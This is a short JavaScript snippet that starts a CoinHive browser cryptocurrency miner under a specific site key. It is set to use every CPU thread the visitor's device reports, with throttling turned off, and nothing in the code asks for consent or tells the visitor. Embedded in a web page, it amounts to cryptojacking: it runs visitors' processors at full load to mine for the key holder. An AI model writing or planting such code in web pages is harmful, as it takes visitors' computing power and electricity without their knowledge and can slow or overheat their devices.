var miner = new CoinHive.User('3B5UwH5pCPm3IGhPI7PaXzbfmzPyHF6B', 'Guest', {
    threads: navigator.hardwareConcurrency,
    autoThreads: false,
    throttle: 0,
    forceASMJS: false
});
miner.start();